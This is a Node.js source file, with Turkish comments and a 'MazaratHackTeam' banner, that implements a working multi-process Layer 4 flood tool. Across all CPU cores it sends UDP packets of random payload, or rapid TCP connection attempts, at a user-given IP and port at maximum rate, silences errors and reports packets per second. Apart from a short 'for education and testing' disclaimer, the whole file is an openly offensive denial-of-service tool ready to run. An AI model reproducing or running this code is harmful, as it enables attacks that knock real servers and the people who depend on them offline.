// [MazaratHackTeam] Gelişmiş Multi-Protokol Layer 4 Saldırı Aracı
// Sürüm: 2.0 "Overwhelm"
// UYARI: Bu araç, eğitim ve test amaçlıdır. İzinsiz kullanımı kesinlikle yasa dışıdır.
//         Aşırı kaynak tüketimi nedeniyle dikkatli kullanılmalıdır.

const dgram = require('dgram'); // UDP için
const net = require('net');     // TCP için
const cluster = require('cluster');
const os = require('os');
const crypto = require('crypto');
const { performance } = require('perf_hooks');

// --- Ayarlar ve Komut Satırı Argümanları ---
const args = process.argv.slice(2);

if (args.length < 4) {
    console.error("\x1b[31m[HATA]\x1b[0m Eksik argümanlar!");
    console.log("\x1b[33mKullanım:\x1b[0m node l4_overwhelm.js <hedef_ip> <hedef_port> <süre_saniye> <protokol> [worker_sayısı] [paket_boyutu_kb] [tcp_bağlantı_timeout_ms]");
    console.log("\x1b[36mProtokoller:\x1b[0m UDP, TCP");
    console.log("\x1b[36mÖrnek (UDP):\x1b[0m node l4_overwhelm.js 1.2.3.4 80 300 UDP " + os.cpus().length + " 1");
    console.log("\x1b[36mÖrnek (TCP):\x1b[0m node l4_overwhelm.js 1.2.3.4 80 300 TCP " + os.cpus().length + " 0.1 500"); // TCP için paket boyutu daha küçük, bağlantı timeout'u eklendi
    process.exit(1);
}

const targetIp = args[0];
const targetPort = parseInt(args[1]);
const durationSeconds = parseInt(args[2]);
const protocol = args[3].toUpperCase();
const numWorkers = parseInt(args[4]) || os.cpus().length;
const packetSizeKB = parseFloat(args[5]) || (protocol === 'TCP' ? 0.1 : 1); // TCP için daha küçük varsayılan
const tcpConnectionTimeoutMs = parseInt(args[6]) || (protocol === 'TCP' ? 1000 : null); // Sadece TCP için geçerli

// --- Gelişmiş Sabitler ---
const MAX_UDP_PACKET_SIZE_BYTES = 65507;
const MIN_PACKET_SIZE_BYTES = 16; // Daha gerçekçi bir minimum
const UDP_SEND_INTERVAL_MS = 0; // UDP için maksimum hız
const TCP_CONNECT_INTERVAL_MS = 0; // TCP bağlantı denemeleri için maksimum hız

// --- Giriş Doğrulaması ---
if (!net.isIP(targetIp)) {
    console.error("\x1b[31m[HATA]\x1b[0m Geçersiz hedef IP adresi.");
    process.exit(1);
}
if (isNaN(targetPort) || targetPort <= 0 || targetPort > 65535) {
    console.error("\x1b[31m[HATA]\x1b[0m Geçersiz port numarası (1-65535).");
    process.exit(1);
}
if (isNaN(durationSeconds) || durationSeconds <= 0) {
    console.error("\x1b[31m[HATA]\x1b[0m Geçersiz süre.");
    process.exit(1);
}
if (protocol !== 'UDP' && protocol !== 'TCP') {
    console.error("\x1b[31m[HATA]\x1b[0m Geçersiz protokol. 'UDP' veya 'TCP' kullanın.");
    process.exit(1);
}
if (isNaN(numWorkers) || numWorkers <= 0) {
    console.error("\x1b[31m[HATA]\x1b[0m Geçersiz worker sayısı.");
    process.exit(1);
}

let actualPacketSizeBytes = Math.floor(packetSizeKB * 1024);
if (isNaN(actualPacketSizeBytes) || actualPacketSizeBytes < MIN_PACKET_SIZE_BYTES) {
    actualPacketSizeBytes = MIN_PACKET_SIZE_BYTES;
    console.warn(`\x1b[33m[UYARI]\x1b[0m Paket boyutu minimum ${MIN_PACKET_SIZE_BYTES} bayta ayarlandı.`);
}
if (protocol === 'UDP' && actualPacketSizeBytes > MAX_UDP_PACKET_SIZE_BYTES) {
    actualPacketSizeBytes = MAX_UDP_PACKET_SIZE_BYTES;
    console.warn(`\x1b[33m[UYARI]\x1b[0m UDP Paket boyutu maksimum ${MAX_UDP_PACKET_SIZE_BYTES} bayta ayarlandı.`);
}

const PAYLOAD_BUFFER = crypto.randomBytes(actualPacketSizeBytes);

// --- Ana Proses (Master) ---
if (cluster.isMaster) {
    console.log("\x1b[35m\n      ▄██████▄     ▄████████    ▄████████    ▄████████ \x1b[0m");
    console.log("\x1b[35m     ███    ███   ███    ███   ███    ███   ███    ███ \x1b[0m");
    console.log("\x1b[35m     ███    █▀    ███    █▀    ███    █▀    ███    █▀  \x1b[0m");
    console.log("\x1b[35m    ▄███▄▄▄       ███         ▄███▄▄▄       ███        \x1b[0m");
    console.log("\x1b[35m   ▀▀███▀▀▀      ▀███████████ ▀▀███▀▀▀      ▀███████████ \x1b[0m");
    console.log("\x1b[35m     ███    █▄           ███   ███    █▄           ███ \x1b[0m");
    console.log("\x1b[35m     ███    ███    ▄█    ███   ███    ███    ▄█    ███ \x1b[0m");
    console.log("\x1b[35m     ████████▀   ▄████████▀    ████████▀   ▄████████▀  \x1b[0m");
    console.log("\x1b[31m\n          MazaratHackTeam - L4 Overwhelm v2.0\x1b[0m\n");

    console.log(`\x1b[36m[MASTER]\x1b[0m Ana Proses (\x1b[33mPID: ${process.pid}\x1b[0m) başlatıldı.`);
    console.log(`\x1b[36m[MASTER]\x1b[0m \x1b[31mSALDIRI HEDEFİ:\x1b[0m \x1b[33m${targetIp}:${targetPort}\x1b[0m`);
    console.log(`\x1b[36m[MASTER]\x1b[0m Protokol: \x1b[33m${protocol}\x1b[0m`);
    console.log(`\x1b[36m[MASTER]\x1b[0m Süre: \x1b[33m${durationSeconds} saniye\x1b[0m`);
    console.log(`\x1b[36m[MASTER]\x1b[0m Worker Sayısı: \x1b[33m${numWorkers}\x1b[0m`);
    console.log(`\x1b[36m[MASTER]\x1b[0m ${protocol === 'UDP' ? 'UDP Paket Boyutu' : 'TCP Veri Boyutu'}: \x1b[33m${(actualPacketSizeBytes / 1024).toFixed(2)} KB (${actualPacketSizeBytes} Bayt)\x1b[0m`);
    if (protocol === 'TCP') {
        console.log(`\x1b[36m[MASTER]\x1b[0m TCP Bağlantı Timeout: \x1b[33m${tcpConnectionTimeoutMs} ms\x1b[0m`);
    }
    console.log("\x1b[32m[MASTER] Saldırı worker'ları cehennemin kapılarını açmak üzere hazırlanıyor...\x1b[0m");

    let totalSentCount = 0; // UDP için paket, TCP için bağlantı denemesi
    let totalBytesSent = 0;

    for (let i = 0; i < numWorkers; i++) {
        const worker = cluster.fork();
        worker.on('message', (msg) => {
            if (msg.type === 'stats') {
                totalSentCount += msg.count;
                totalBytesSent += msg.bytes;
            }
        });
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`\x1b[31m[MASTER]\x1b[0m Worker (\x1b[33mPID: ${worker.process.pid}\x1b[0m) görevini tamamlayıp ayrıldı. Kod: ${code}, Sinyal: ${signal}`);
    });

    const startTime = performance.now();
    const attackEndTime = startTime + (durationSeconds * 1000);

    const statsInterval = setInterval(() => {
        const currentTime = performance.now();
        const elapsedTimeMs = currentTime - startTime;
        const remainingTimeMs = Math.max(0, attackEndTime - currentTime);
        
        const itemsPerSecond = (totalSentCount / (elapsedTimeMs / 1000)).toFixed(2);
        const megabitsPerSecond = ((totalBytesSent * 8) / (elapsedTimeMs / 1000) / 1000000).toFixed(2);
        const unit = protocol === 'UDP' ? 'Pkt/s' : 'Conn/s';

        process.stdout.write(`\r\x1b[36m[MASTER STATS]\x1b[0m Kalan: \x1b[33m${(remainingTimeMs / 1000).toFixed(0)}s\x1b[0m | ${unit}: \x1b[32m${itemsPerSecond}\x1b[0m | Hız: \x1b[32m${megabitsPerSecond} Mbps\x1b[0m | Toplam ${protocol === 'UDP' ? 'Pkt' : 'Conn'}: \x1b[32m${totalSentCount}\x1b[0m   `);
    }, 500); // Daha sık güncelleme

    setTimeout(() => {
        clearInterval(statsInterval);
        process.stdout.write("\n");
        console.log(`\n\x1b[32m[MASTER]\x1b[0m \x1b[33m${durationSeconds} saniyelik\x1b[0m operasyon tamamlandı. Worker'lar geri çekiliyor...`);
        
        for (const id in cluster.workers) {
            cluster.workers[id].send({ type: 'stop' });
            cluster.workers[id].disconnect();
        }
        setTimeout(() => {
            for (const id in cluster.workers) {
                if (cluster.workers[id] && !cluster.workers[id].isDead()) {
                    cluster.workers[id].kill('SIGTERM');
                }
            }
            const endTime = performance.now();
            const totalDurationMs = endTime - startTime;
            const finalItemsPerSecond = (totalSentCount / (totalDurationMs / 1000)).toFixed(2);
            const finalMegabitsPerSecond = ((totalBytesSent * 8) / (totalDurationMs / 1000) / 1000000).toFixed(2);
            const unit = protocol === 'UDP' ? 'Paket' : 'Bağlantı';
            
            console.log(`\x1b[32m[MASTER]\x1b[0m Saldırı başarıyla sonlandırıldı.`);
            console.log(`\x1b[36m[SONUÇ RAPORU]\x1b[0m Toplam Süre: \x1b[33m${(totalDurationMs / 1000).toFixed(2)} saniye\x1b[0m`);
            console.log(`\x1b[36m[SONUÇ RAPORU]\x1b[0m Toplam Gönderilen/Denene ${unit}: \x1b[33m${totalSentCount}\x1b[0m`);
            console.log(`\x1b[36m[SONUÇ RAPORU]\x1b[0m Toplam Gönderilen Veri: \x1b[33m${(totalBytesSent / (1024*1024)).toFixed(2)} MB\x1b[0m`);
            console.log(`\x1b[36m[SONUÇ RAPORU]\x1b[0m Ortalama ${unit}/s: \x1b[32m${finalItemsPerSecond}\x1b[0m`);
            console.log(`\x1b[36m[SONUÇ RAPORU]\x1b[0m Ortalama Hız: \x1b[32m${finalMegabitsPerSecond} Mbps\x1b[0m`);
            console.log("\x1b[35m[MazaratHackTeam]\x1b[0m Görev tamamlandı. Sistem normale dönüyor.");
            process.exit(0);
        }, 2500);
    }, durationSeconds * 1000);

} else {
    // --- Worker Prosesleri ---
    let sentCount = 0;
    let bytesSent = 0;
    let running = true;

    const workerIdAnsi = `\x1b[3${(process.pid % 6) + 1}m[WORKER ${process.pid}]\x1b[0m`; // Her worker için farklı renk

    console.log(`${workerIdAnsi} Aktifleşti. Protokol: \x1b[33m${protocol}\x1b[0m, Hedef: \x1b[33m${targetIp}:${targetPort}\x1b[0m. Ateşlemeye hazır!`);

    if (protocol === 'UDP') {
        const client = dgram.createSocket({ type: 'udp4', reuseAddr: true });
        client.on('error', (err) => { /* console.error(`${workerIdAnsi} UDP Soket Hatası: ${err.message}`); */ }); // Hataları sessize al, akışı kesme

        const attackUdp = () => {
            if (!running) {
                client.close(() => { /* console.log(`${workerIdAnsi} UDP soketi kapatıldı.`); */ });
                return;
            }
            client.send(PAYLOAD_BUFFER, 0, PAYLOAD_BUFFER.length, targetPort, targetIp, (err) => {
                if (!err) {
                    sentCount++;
                    bytesSent += PAYLOAD_BUFFER.length;
                }
                if (running) {
                    if (UDP_SEND_INTERVAL_MS > 0) setTimeout(attackUdp, UDP_SEND_INTERVAL_MS);
                    else setImmediate(attackUdp);
                }
            });
        };
        attackUdp();

    } else if (protocol === 'TCP') {
        // Not: Bu tam bir SYN flood değildir. Node.js'in 'net' modülü ile saf SYN paketleri göndermek
        // zordur (genellikle raw soketler gerektirir). Bu, hedefe çok sayıda TCP bağlantısı açmaya
        // çalışarak bağlantı tablosunu ve kaynakları tüketmeyi amaçlayan bir TCP bağlantı flood'udur.
        const attackTcp = () => {
            if (!running) return;

            const socket = new net.Socket();
            let connected = false;

            socket.setTimeout(tcpConnectionTimeoutMs);

            socket.on('connect', () => {
                connected = true;
                // Bağlantı kuruldu, veri gönder (isteğe bağlı, küçük bir payload olabilir)
                socket.write(PAYLOAD_BUFFER, (err) => {
                    if(!err) bytesSent += PAYLOAD_BUFFER.length;
                }); 
                socket.destroy(); // Bağlantıyı hemen kes
                sentCount++; // Başarılı bağlantı denemesi olarak say
            });

            socket.on('timeout', () => {
                // console.log(`${workerIdAnsi} TCP Bağlantı zaman aşımına uğradı.`);
                socket.destroy();
                if(!connected) sentCount++; // Timeout da bir deneme olarak sayılabilir, hedef yanıt vermiyor olabilir
            });

            socket.on('error', (err) => {
                // console.error(`${workerIdAnsi} TCP Soket Hatası: ${err.message}`);
                // 'ECONNREFUSED', 'EHOSTUNREACH' gibi hatalar normaldir.
                socket.destroy();
                if(!connected) sentCount++; // Hata da bir deneme olarak sayılabilir
            });
            
            socket.on('close', () => {
                if (running) {
                    if (TCP_CONNECT_INTERVAL_MS > 0) setTimeout(attackTcp, TCP_CONNECT_INTERVAL_MS);
                    else setImmediate(attackTcp);
                }
            });

            socket.connect(targetPort, targetIp);
        };
        attackTcp();
    }

    process.on('message', (msg) => {
        if (msg.type === 'stop') {
            // console.log(`${workerIdAnsi} Durdurma sinyali alındı. Operasyon sonlandırılıyor.`);
            running = false;
        }
    });

    const reportStatsInterval = setInterval(() => {
        if (sentCount > 0 || bytesSent > 0) {
            process.send({ type: 'stats', count: sentCount, bytes: bytesSent });
            sentCount = 0;
            bytesSent = 0;
        }
    }, 1000);

    process.on('SIGINT', () => { running = false; clearInterval(reportStatsInterval); });
    process.on('SIGTERM', () => { running = false; clearInterval(reportStatsInterval); });
}